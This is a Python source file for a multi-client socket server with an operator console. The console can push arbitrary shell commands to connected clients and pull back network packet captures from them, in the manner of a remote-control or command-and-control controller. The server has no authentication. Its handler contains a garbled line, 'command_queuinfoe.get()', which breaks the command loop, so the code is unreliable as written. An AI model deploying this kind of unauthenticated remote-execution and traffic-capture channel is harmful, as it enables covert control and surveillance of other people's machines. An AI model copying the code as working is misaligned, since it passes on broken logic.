import socket
import threading
import queue
import json
import os
import time

# Shared data structure for clients
clients = {}
clients_lock = threading.Lock()
clients_file = "clients.json"

HOST_IP = "192.168.0.1"
PORT = 5000

def listener():
    """Listen for incoming client connections."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST_IP, PORT))
    server_socket.listen(5)
    print(f"Server listening on {HOST_IP}:{PORT}...")
    
    while True:
        client_socket, addr = server_socket.accept()
        client_info = json.loads(client_socket.recv(1024).decode())
        with clients_lock:
            client_id = len(clients) + 1
            command_queue = queue.Queue()
            clients[client_id] = {
                "info": client_info,
                "queue": command_queue,
                "thread": threading.Thread(
                    target=client_handler, args=(client_socket, command_queue, client_id)
                ),
            }
            clients[client_id]["thread"].start()
            # Collect data while holding the lock
            data = {cid: client["info"] for cid, client in clients.items()}
        # Write to file outside the lock
        with open(clients_file, "w") as f:
            json.dump(data, f, indent=2)
        print(f"Client {client_id} ({client_info['hostname']}) connected.")
        
def receive_header(socket):
    buffer = b""  # Byte string to accumulate data
    while True:
        chunk = socket.recv(1024)  # Receive up to 1024 bytes
        if not chunk:  # Socket closed unexpectedly
            raise ConnectionError("Client disconnected before sending header")
        buffer += chunk
        if b"\n" in buffer:  # Newline found
            header, remaining = buffer.split(b"\n", 1)  # Split at first newline
            return header.decode("utf-8"), remaining  # Decode header, return rest as bytes

def client_handler(client_socket, command_queue, client_id):
    """Handle communication with a single client."""
    try:
        while True:
            if not command_queue.empty():
                command = command_queuinfoe.get()
                client_socket.send(command.encode())
                if command.startswith("CAPTURE"):
                    header, initial_data = receive_header(client_socket)
                    if header.startswith("PCAP"):
                        size = int(header.split()[1])  # Extract size from "PCAP <size>"
                        pcap_data = b""
                        while len(pcap_data) < size:
                            chunk = client_socket.recv(min(4096, size - len(pcap_data)))
                            if not chunk:
                                break
                            pcap_data += chunk
                        hostname = clients[client_id]["info"]["hostname"]
                        timestamp = time.strftime("%Y%m%d_%H%M%S")
                        filename = f"./pcaps/{hostname}_{timestamp}.pcap"
                        os.makedirs("./pcaps", exist_ok=True)
                        with open(filename, "wb") as f:
                            f.write(pcap_data)
                        print(f"PCAP saved to {filename}")
                elif command.startswith("EXECUTE"):
                    # Receive command output
                    response = client_socket.recv(1024).decode()
                    if response.startswith("OUTPUT"):
                        size = int(response.split()[1])
                        output = b""
                        while len(output) < size:
                            chunk = client_socket.recv(min(4096, size - len(output)))
                            if not chunk:
                                break
                            output += chunk
                        print(f"Output from client {client_id}:\n{output.decode()}")
    except Exception as e:
        print(f"Client {client_id} disconnected: {e}")
        with clients_lock:
            if client_id in clients:
                del clients[client_id]
                # Collect data while holding the lock
                data = {cid: client["info"] for cid, client in clients.items()}
        # Write to file outside the lock
        with open(clients_file, "w") as f:
            json.dump(data, f, indent=2)

def cli():
    """Command-line interface for server management."""
    while True:
        command = input("> ").strip()
        if command == "start":
            # Listener is already started in a thread, so this is informational
            print("Server is already running.")
        elif command == "list":
            with clients_lock:
                if not clients:
                    print("No connected clients.")
                for client_id, client in clients.items():
                    print(f"{client_id}: {client['info']['hostname']}")
        elif command.startswith("info"):
            try:
                parts = command.split()
                client_id = int(parts[1])
                with clients_lock:
                    if client_id in clients:
                        print(json.dumps(clients[client_id]["info"], indent=2))
                    else:
                        print(f"Client {client_id} not found.")
            except (IndexError, ValueError):
                print("Usage: info <client_id>")
        elif command.startswith("capture"):
            try:
                parts = command.split()
                client_id = int(parts[1])
                duration = int(parts[2])
                with clients_lock:
                    if client_id in clients:
                        clients[client_id]["queue"].put(f"CAPTURE {duration}\n")
                        print(f"Requested packet capture for {duration} seconds on client {client_id}.")
                    else:
                        print(f"Client {client_id} not found.")
            except (IndexError, ValueError):
                print("Usage: capture <client_id> <duration>")
        elif command.startswith("execute"):
            try:
                parts = command.split(maxsplit=2)
                client_id = int(parts[1])
                cmd = parts[2]
                with clients_lock:
                    if client_id in clients:
                        clients[client_id]["queue"].put(f"EXECUTE {cmd}\n")
                        print(f"Sent command '{cmd}' to client {client_id}.")
                    else:
                        print(f"Client {client_id} not found.")
            except IndexError:
                print("Usage: execute <client_id> <command>")
        elif command == "view_pcaps":
            if not os.path.exists("./pcaps"):
                print("No PCAP files found.")
            else:
                for file in os.listdir("./pcaps"):
                    if file.endswith(".pcap"):
                        print(file)
        elif command == "quit":
            print("Shutting down server...")
            break
        else:
            print("Commands: start, list, info <id>, capture <id> <duration>, execute <id> <command>, view_pcaps, quit")

if __name__ == "__main__":
    # Start the listener in a separate thread
    threading.Thread(target=listener, daemon=True).start()
    cli()